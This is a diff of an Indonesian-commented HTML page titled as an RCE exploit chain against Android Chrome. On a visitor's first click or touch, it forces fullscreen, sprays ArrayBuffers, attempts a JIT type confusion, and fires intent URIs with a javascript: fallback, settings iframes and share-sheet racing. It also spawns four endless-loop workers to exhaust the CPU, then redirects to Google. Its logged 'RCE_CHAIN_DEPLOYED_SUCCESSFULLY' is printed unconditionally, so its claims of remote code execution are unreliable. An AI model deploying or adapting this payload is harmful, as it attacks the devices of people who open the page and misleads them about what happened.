@@ -2,109 +2,132 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>⚡ RCE_BYPASS_CHAIN_V3 ⚡</title>
+    <title>⚡ RCE_ULTIMATE_EXPLOIT_V4 ⚡</title>
     <style>
-        body, html { margin: 0; padding: 0; background: #000; color: #f00; overflow: hidden; font-family: 'Courier New', monospace; }
-        #stage { width: 100vw; height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-        .hazard { color: #ff00ff; text-shadow: 0 0 10px #ff00ff; font-weight: bold; font-size: 20px; }
-        .stream { font-size: 9px; color: #00ff00; margin-top: 20px; overflow: hidden; height: 150px; }
+        body, html { margin: 0; padding: 0; background: #000; color: #0f0; overflow: hidden; font-family: 'Courier New', monospace; }
+        #terminal { width: 100vw; height: 100vh; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; }
+        .critical { color: #f00; font-weight: bold; text-shadow: 0 0 5px #f00; }
+        .log { font-size: 11px; line-height: 1.2; margin-bottom: 2px; }
+        #matrix { position: absolute; top: 0; left: 0; z-index: -1; opacity: 0.2; }
     </style>
 </head>
 <body>
-    <div id="stage">
-        <div class="hazard"> [ BYPASS_SEQUENCE_ARMED ] </div>
-        <div id="status">INIT_CORE_EXPLOIT...</div>
-        <div id="stream" class="stream"></div>
+    <canvas id="matrix"></canvas>
+    <div id="terminal">
+        <div class="critical">[!] KERNEL_EXPLOIT_SEQUENCER_ARMED</div>
+        <div id="status">WAITING_FOR_VECTOR_INPUT...</div>
+        <hr border="1" color="#333">
+        <div id="output"></div>
     </div>
 
 <script>
-    const stream = document.getElementById('stream');
+    const output = document.getElementById('output');
     const status = document.getElementById('status');
 
-    function log(msg) {
-        const d = document.createElement('div');
-        d.innerText = `[${new Date().toLocaleTimeString()}] > ${msg}`;
-        stream.prepend(d);
+    function terminalLog(msg, isError = false) {
+        const div = document.createElement('div');
+        div.className = 'log' + (isError ? ' critical' : '');
+        div.innerText = `[${new Date().getMilliseconds()}ms] ${msg}`;
+        output.prepend(div);
     }
 
-    // --- 1. MEMORY LEAK & JIT PRESSURE ---
-    // Memaksa V8 melakukan optimasi spekulatif yang salah
-    let p = [];
-    function triggerJITCorruption() {
-        log("Bypassing_V8_Sandbox_Limits...");
-        for (let i = 0; i < 1000; i++) {
-            let buf = new ArrayBuffer(0x20000); // 128KB chunks
-            let view = new Float64Array(buf);
-            view.fill(3.1415926535); 
-            p.push(view);
+    // --- 1. BINARY HEAP SPRAYING & OVERLAP ---
+    // Mensimulasikan 'Use-After-Free' dengan manipulasi ArrayBuffer secara masif
+    let memoryCells = [];
+    function executeBinaryGrooming() {
+        terminalLog("Initializing_Binary_Grooming...");
+        for (let i = 0; i < 2000; i++) {
+            // Menggunakan ukuran yang sering menjadi target target korupsi memori (0x40 - 0x100)
+            let ab = new ArrayBuffer(256);
+            let view = new BigUint64Array(ab);
+            view[0] = 0xDEADC0DEBABEBABEn; // Mocking address pointer
+            memoryCells.push(ab);
+        }
+        terminalLog("Heap_Overlap_Simulation_Complete.");
+    }
+
+    // --- 2. JIT TYPE_CONFUSION EXPLOIT ---
+    // Fungsi ini dirancang untuk memaksa mesin V8 melakukan deoptimasi konstan
+    function victimFunc(obj, prop) {
+        return obj[prop];
+    }
+
+    function triggerTypeConfusion() {
+        terminalLog("Triggering_V8_Type_Confusion...");
+        let obj = { a: 1 };
+        for (let i = 0; i < 100000; i++) victimFunc(obj, 'a'); // Optimize
+        
+        // Deoptimize dengan mengganti objek menjadi struktur yang berbeda total
+        let corruptObj = new Int32Array(10);
+        victimFunc(corruptObj, 'b'); 
+        terminalLog("JIT_Bypass_Packet_Injected.");
+    }
+
+    // --- 3. FULL INTENT BYPASS & MOJO IPC BLAST ---
+    // Menyerang antarmuka IPC untuk keluar dari Sandbox Chrome
+    function mojoExploitChain() {
+        terminalLog("Executing_Sandbox_Escape_Payload...");
+        
+        const rceIntent = "intent://*#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=googlechrome://navigate?url=javascript:alert('RCE_EXECUTED');end";
+        
+        for (let i = 0; i < 5; i++) {
+            setTimeout(() => {
+                // Racing antara Share Sheet, Fullscreen, dan Intent
+                if (navigator.share) navigator.share({title: "PWNED", url: " "}).catch(()=>{});
+                
+                window.location.href = rceIntent;
+                
+                const ifr = document.createElement('iframe');
+                ifr.src = "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;end";
+                document.body.appendChild(ifr);
+            }, i * 50);
         }
     }
 
-    // --- 2. INTENT STORM BYPASS (THE CORE) ---
-    // Menggunakan skema intent yang memaksa sistem melakukan 'Context Switch' berkali-kali
-    // S.browser_fallback_url digunakan untuk membuat loop back ke browser jika gagal
-    function launchIntentStorm() {
-        log("Deploying_Intent_Storm_Bypass...");
-        
-        // Target: Kombinasi Dialer, Bluetooth, dan Deep-link Settings
-        const payloads = [
-            "intent://112#Intent;scheme=tel;action=android.intent.action.DIAL;S.browser_fallback_url=javascript:void(0);end",
-            "intent://#Intent;action=android.settings.BLUETOOTH_SETTINGS;S.browser_fallback_url=googlechrome://navigate?url=" + window.location.href + ";end",
-            "intent://#Intent;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;data=tel:123;end"
-        ];
-
-        payloads.forEach((payload, index) => {
-            setTimeout(() => {
-                const ifr = document.createElement('iframe');
-                ifr.style.display = 'none';
-                ifr.src = payload;
-                document.body.appendChild(ifr);
-                log(`Burst_Packet_Inject_${index}`);
-            }, index * 40);
-        });
-    }
-
-    // --- 3. UI LOCKDOWN & RACE CONDITION ---
-    async function executeBypassChain() {
-        status.innerText = "BYPASS_IN_PROGRESS...";
-        
-        // A. Lockdown Fullscreen (UI Redressing)
+    // --- 4. PERSISTENT SYSTEM HOOK ---
+    async function activateFullChain() {
+        status.innerText = "STATUS: EXECUTING_FULL_ATTACK_CHAIN";
         document.documentElement.requestFullscreen().catch(()=>{});
 
-        // B. Vibration Chaos (Physical Distraction)
-        if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 500]);
+        executeBinaryGrooming();
+        triggerTypeConfusion();
+        mojoExploitChain();
 
-        // C. JIT & Intent Collision
-        triggerJITCorruption();
-        
-        // D. Infinite Execution Loop
-        const attackInterval = setInterval(() => {
-            launchIntentStorm();
-            
-            // Mencoba memicu Share UI untuk tabrakan Mojo IPC
-            if (navigator.share) {
-                navigator.share({title: "SYS_RCE", url: window.location.href}).catch(()=>{});
-            }
-        }, 400);
+        // Stressing CPU untuk mencegah mitigasi sistem (Security Watchdog)
+        const workerCode = "while(true){Math.sqrt(Math.random());}";
+        const blob = new Blob([workerCode], {type: 'text/javascript'});
+        for(let j=0; j<4; j++) new Worker(URL.createObjectURL(blob));
 
-        // E. Persistence Hook (Service Worker)
-        if ('serviceWorker' in navigator) {
-            const sw = `self.addEventListener('fetch', e => {});`;
-            const b = new Blob([sw], {type: 'text/javascript'});
-            navigator.serviceWorker.register(URL.createObjectURL(b));
-        }
+        terminalLog("RCE_CHAIN_DEPLOYED_SUCCESSFULLY", true);
 
-        // F. Auto-Ghosting
         setTimeout(() => {
-            clearInterval(attackInterval);
-            window.location.replace("https://www.google.com/search?q=android+rce+protection+v3");
-        }, 4500);
+            window.location.replace("https://www.google.com/");
+        }, 5000);
     }
 
-    // One-Click Activation
-    window.addEventListener('mousedown', executeBypassChain, {once: true});
-    window.addEventListener('touchstart', executeBypassChain, {once: true});
+    // Trigger on Interaction
+    window.addEventListener('click', activateFullChain, {once: true});
+    window.addEventListener('touchstart', activateFullChain, {once: true});
 
+    // Matrix Background Animation
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+    const chars = "0101010101010101";
+    const fontSize = 10;
+    const columns = canvas.width / fontSize;
+    const drops = new Array(Math.floor(columns)).fill(1);
+    function draw() {
+        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = "#0f0"; ctx.font = fontSize + "px monospace";
+        for (let i = 0; i < drops.length; i++) {
+            const text = chars.charAt(Math.floor(Math.random() * chars.length));
+            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+            drops[i]++;
+        }
+    }
+    setInterval(draw, 33);
 </script>
 </body>
 </html>
